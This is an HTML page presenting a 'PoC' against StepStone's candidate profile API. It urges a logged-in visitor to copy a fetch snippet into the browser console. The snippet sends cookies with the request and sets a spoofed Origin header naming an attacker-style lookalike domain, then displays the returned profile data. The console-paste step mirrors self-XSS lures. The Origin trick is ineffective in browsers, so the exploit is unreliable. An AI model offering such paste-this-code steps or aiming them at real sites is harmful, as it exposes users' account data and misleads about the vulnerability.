<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>Hello — Paste PoC in Console</title>
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <style>
    body { font-family: system-ui, -apple-system, "Segoe UI", Roboto, Arial; padding: 28px; color:#0f172a; background:#f8fafc; }
    h1 { margin:0 0 10px 0; font-size:28px; }
    p { margin:0 0 18px 0; color:#475569; }
    textarea { width:100%; height:220px; padding:10px; border-radius:8px; border:1px solid #cbd5e1; font-family: monospace; background:#fff; }
    button { margin-top:10px; padding:10px 14px; border-radius:8px; border:0; background:#0ea5a4; color:white; cursor:pointer; }
    .muted { color:#64748b; font-size:0.95rem; margin-top:10px; }
  </style>
</head>
<body>
  <h1>Hello</h1>
  <p>Open Developer Tools → Console in this browser session (same profile where you're logged into StepStone). Click <strong>Copy PoC</strong>, then paste the copied code into the Console and press Enter.</p>

  <label for="poc">PoC fetch (copy & paste into console):</label>
  <textarea id="poc" readonly>
fetch('https://www.stepstone.de/candidate/profile/editor/api/v1/profile', {
  method: 'GET',
  credentials: 'include', // Sends authenticated cookies
  headers: {
    // replace origin value with your PoC domain if you want a different origin shown
    'Origin': 'https://www.stepstone.de.i-am-hunter.xyz'
  }
})
.then(response => {
  console.log("✅ Server reflected origin:", response.headers.get('Access-Control-Allow-Origin'));
  console.log("✅ Access-Control-Allow-Credentials:", response.headers.get('Access-Control-Allow-Credentials'));
  return response.text().then(t => {
    try { return JSON.parse(t); } catch(e){ return t; }
  });
})
.then(data => {
  console.log("✅ Response body:", data);
  // optionally display on page
  const pre = document.createElement('pre');
  pre.textContent = JSON.stringify(data, null, 2);
  document.body.appendChild(pre);
})
.catch(error => console.error('Error:', error));
  </textarea>

  <div>
    <button id="copyBtn">Copy PoC</button>
  </div>

  <div class="muted">Tip: In Firefox press <kbd>Ctrl+Shift+K</kbd>, in Chrome press <kbd>Ctrl+Shift+J</kbd> (or F12) to open Console. Then paste and run.</div>

  <script>
    document.getElementById('copyBtn').addEventListener('click', async () => {
      const txt = document.getElementById('poc').value;
      try {
        await navigator.clipboard.writeText(txt);
        alert('PoC copied to clipboard — now open DevTools Console and paste (Ctrl+V) then Enter.');
        console.log('PoC copied to clipboard. Paste into console to run.');
      } catch (e) {
        // fallback
        document.getElementById('poc').select();
        document.execCommand('copy');
        alert('Copied (fallback). Paste into Console (Ctrl+V) and press Enter.');
      }
    });
  </script>
</body>
</html>
